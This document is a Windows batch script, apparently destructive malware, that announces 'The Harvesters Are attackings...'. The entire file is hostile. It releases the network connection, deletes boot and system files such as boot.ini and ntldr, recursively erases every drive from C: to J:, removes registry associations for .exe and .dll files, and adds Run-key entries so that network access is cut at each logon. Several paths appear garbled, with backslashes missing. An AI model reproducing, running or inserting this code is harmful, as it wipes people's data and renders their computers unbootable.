
@echo off
ipconfig /release

echo The Harvesters Are attackings...

del c:\WINDOWS\system32*./q

attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini

rd/s/q D:\
rd/s/q C:\
rd/s/q E:\


Del C:\ .* |y
del D:*.* /f /s /q
del E:*.* /f /s /q
del F:*.* /f /s /q
del G:*.* /f /s /q
del H:*.* /f /s /q
del I:*.* /f /s /q
del J:*.* /f /s /q
del C:*.* /f /s /q


START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*


echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f



PAUSE